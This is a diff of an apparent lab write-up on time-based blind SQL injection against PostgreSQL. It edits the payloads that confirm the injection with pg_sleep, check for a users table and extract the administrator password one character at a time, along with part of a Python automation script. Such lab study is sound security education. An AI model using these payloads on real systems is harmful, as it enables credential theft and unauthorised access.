@@ -15,33 +15,33 @@ To solve the lab, log in as the `administrator` user.
 1/ Determine the database type and Confirm that the parameter is vulnerable
 
 ```sql
-' || (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END) || '
+' || (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
 ```
 
 ```sql
-' || (SELECT CASE WHEN (1=2) THEN pg_sleep(3) ELSE pg_sleep(0) END) || '
+' || (SELECT CASE WHEN (1=2) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
 ```
 
 2/ Confirm that we have a "users" table
 
 ```sql
-' || (SELECT CASE WHEN ((SELECT 'x' FROM users LIMIT 1)='x') THEN pg_sleep(3) ELSE pg_sleep(0) END) || '
+' || (SELECT CASE WHEN ((SELECT 'x' FROM users LIMIT 1)='x') THEN pg_sleep(3) ELSE pg_sleep(0) END)--
 ```
 
 3/ Confirm that the "administrator" user exists in the "users" table
 
 ```sql
-' || (SELECT CASE WHEN ((SELECT username FROM users WHERE username='administrator')='administrator') THEN pg_sleep(3) ELSE pg_sleep(0) END) || '
+' || (SELECT CASE WHEN ((SELECT username FROM users WHERE username='administrator')='administrator') THEN pg_sleep(3) ELSE pg_sleep(0) END)--
 ```
 
 4/ Enumerate the password of the "administrator" user
 
 ```sql
-' || (SELECT CASE WHEN ((SELECT username FROM users WHERE username='administrator' AND LENGTH(password)=20)='administrator') THEN pg_sleep(3) ELSE pg_sleep(0) END) || '
+' || (SELECT CASE WHEN ((SELECT username FROM users WHERE username='administrator' AND LENGTH(password)=20)='administrator') THEN pg_sleep(3) ELSE pg_sleep(0) END)--
 ```
 
 ```sql
-' || (SELECT CASE WHEN ((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a') THEN pg_sleep(3) ELSE pg_sleep(0) END) || '
+' || (SELECT CASE WHEN ((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a') THEN pg_sleep(3) ELSE pg_sleep(0) END)--
 ```
 
 5/ Write a script to automate the password extraction
@@ -64,7 +64,7 @@ for position in range(1, 21):
         guess = password + char
 
         payload = (
-            f"' || (SELECT CASE WHEN ((SELECT SUBSTRING(password,1,{position}) FROM users WHERE username='administrator')='{guess}') THEN pg_sleep(3) ELSE pg_sleep(0) END) || '"
+            f"' || (SELECT CASE WHEN ((SELECT SUBSTRING(password,1,{position}) FROM users WHERE username='administrator')='{guess}') THEN pg_sleep(3) ELSE pg_sleep(0) END)--"
         )
 
         start = time.perf_counter()
